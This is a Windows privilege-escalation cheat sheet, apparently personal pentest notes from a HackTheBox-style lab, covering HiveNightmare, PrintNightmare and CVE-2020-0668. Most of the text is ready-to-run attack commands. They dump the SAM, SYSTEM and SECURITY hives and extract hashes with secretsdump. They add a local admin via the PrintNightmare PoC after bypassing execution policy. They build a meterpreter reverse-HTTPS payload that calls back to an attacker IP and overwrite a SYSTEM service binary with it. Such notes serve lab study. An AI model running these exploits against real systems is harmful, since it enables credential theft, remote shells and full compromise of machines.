---
tags: [privesc, windows, kernel-exploit]
aliases: [Kernel Exploits]
---

Many kernel exploits affect the Windows operating 
systems. 


# Enumerating Missing Patches

We must first determine what updates may have been missed. 

```shell
systeminfo
wmic qfe list brief
Get-Hotfix
```

We can then search for the KB (Microsoft Knowledge Base ID number) to get a better idea of what fixes have been installed.
# HiveNightmare

A Windows 10 flaw that results in any user having rights to read the Windows registry and access sensitive information regardless of privilege level. You can therefore read the SAM, SYSTEM and SECURITY registry hives. PoC script can be found [here](https://github.com/GossiTheDog/HiveNightmare/tree/master/Release).

```shell
# check permissions on the SAM file
icacls c:\Windows\System32\config\SAM
```

To exploit we need the presence of one or more shadow copies, most Windows installations will have this enabled by default.

```shell
.\HiveNightmare.exe

# once transfered back to the attack host, we can extract the hashes
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```

# PrintNightmare

Flaw in RpcAddPrinterDriver which is used for remote printing and driver installation. Intended to allow users with the `SeLoadDriverPrivilege` to add drivers to a remote Print Spooler. PoC script can be found [here](https://github.com/cube0x0/CVE-2021-1675) and in [Powershell](https://github.com/calebstewart/CVE-2021-1675).

```powershell
# check for spooler service
ls \\localhost\pipe\spoolss

# adding local admin with PrintNightmare  Powershell PoC
Set-ExecutionPolicy Bypass -Scope Process

# run the PoC
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

# CVE-2020-0668

Exploits an arbitrary file move vulnerability leveraging the Windows Service Tracing, which allows user to troubleshoot issues with running services and modules by generating debug information. By setting a custom MaxFileSize in the registry to a value that is smaller than the size of the file prompts the file to be renamed with an `.OLD` extension. This operation is performed by SYSTEM. [PoC](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668). We need to create a file of our choosing in a protected folder like `System32`, it needs to be chained with another vulnerability to privileged file write. 

```shell
# check for permissions on a context of SYSTEM file
icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

# generate a malicious binary
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe

#  run exploit
C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe" 

# now we must overwrite the corrupted file with the malicious binary
copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

```

## Related

- [[windows-old]]
- [[pillaging]]
- [[05-privilege-escalation/linux|Linux]]
- [[credentials-harvesting]]

